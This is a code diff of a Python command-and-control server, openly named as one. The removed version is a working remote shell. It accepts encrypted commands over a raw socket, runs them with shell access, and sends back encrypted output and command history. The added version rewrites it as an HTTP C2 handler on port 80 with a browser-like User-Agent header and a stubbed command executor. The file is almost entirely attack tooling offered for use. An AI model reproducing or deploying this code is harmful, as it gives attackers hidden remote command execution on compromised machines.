@@ -1,83 +1,43 @@
-import socket
-import subprocess
-import logging
-import time
-from cryptography.fernet import Fernet
+import http.server
+import socketserver
+import urllib.parse
 
-# Configure the logging module
-logging.basicConfig(filename='c2_server.log', level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')
+class C2Handler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        # Process GET requests from the client
+        parsed_path = urllib.parse.urlparse(self.path)
+        command = parsed_path.path[1:]  # Extract the command from the URL
+        response = execute_command(command)
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.send_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')
+        self.send_header('X-Custom-Header', 'MyCustomValue')  # Add your custom header here
+        self.end_headers()
+        self.wfile.write(response.encode())
 
-# Generate a symmetric key for encryption (you should securely distribute this key to the client)
-symmetric_key = Fernet.generate_key()
-cipher_suite = Fernet(symmetric_key)
+    def do_POST(self):
+        # Process POST requests from the client (if needed)
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        response = execute_command(post_data.decode())
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.send_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')
+        self.send_header('X-Custom-Header', 'MyCustomValue')  # Add your custom header here
+        self.end_headers()
+        self.wfile.write(response.encode())
 
-def run_command(command):
-    try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        return result.stdout
-    except Exception as e:
-        return str(e)
+def execute_command(command):
+    # Add your command execution logic here
+    # For example, execute the command on the target system
+    return "Command executed successfully"
 
-# Create a socket object
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def run_c2_server():
+    PORT = 80  # Use the common HTTP port 80
+    Handler = C2Handler
+    httpd = socketserver.TCPServer(('0.0.0.0', PORT), Handler)
+    print(f"Listening on port {PORT}")
+    httpd.serve_forever()
 
-# Define the host and port to bind to
-host = '0.0.0.0'  # Listen on all available network interfaces
-port = 12345  # Choose a port number
-
-try:
-    # Bind the socket to the host and port
-    server_socket.bind((host, port))
-
-    # Listen for incoming connections
-    server_socket.listen(5)  # Number of queued connections
-
-    logging.info(f"Server listening on {host}:{port}")
-
-    # Accept incoming connections
-    client_socket, client_address = server_socket.accept()
-
-    logging.info(f"Accepted connection from {client_address}")
-    connection_start_time = time.time()  # Record the connection start time
-    command_history = []  # Store command history
-
-    while True:
-        # Receive an encrypted command from the client
-        encrypted_command = client_socket.recv(1024)
-        if not encrypted_command:
-            break
-
-        # Decrypt the command using the symmetric key
-        command = cipher_suite.decrypt(encrypted_command).decode('utf-8')
-
-        if command.lower() == 'exit':
-            # Exit the loop and close the connection
-            break
-        elif command.lower() == 'history':
-            # Send the command history to the client
-            history_output = "\n".join(command_history)
-            encrypted_history_output = cipher_suite.encrypt(history_output.encode('utf-8'))
-            client_socket.send(encrypted_history_output)
-        else:
-            # Execute the command and send the encrypted output back to the client
-            output = run_command(command)
-            command_history.append(command)
-            
-            # Encrypt the output before sending
-            encrypted_output = cipher_suite.encrypt(output.encode('utf-8'))
-            client_socket.send(encrypted_output)
-
-except socket.error as e:
-    logging.error(f"Socket error: {e}")
-except Exception as e:
-    logging.error(f"Error: {e}")
-
-finally:
-    # Calculate the connection duration and log it
-    connection_duration = time.time() - connection_start_time
-    logging.info(f"Connection from {client_address} closed. Duration: {connection_duration:.2f} seconds")
-
-    # Close the sockets when done
-    client_socket.close()
-    server_socket.close()
-
+if __name__ == "__main__":
+    run_c2_server()
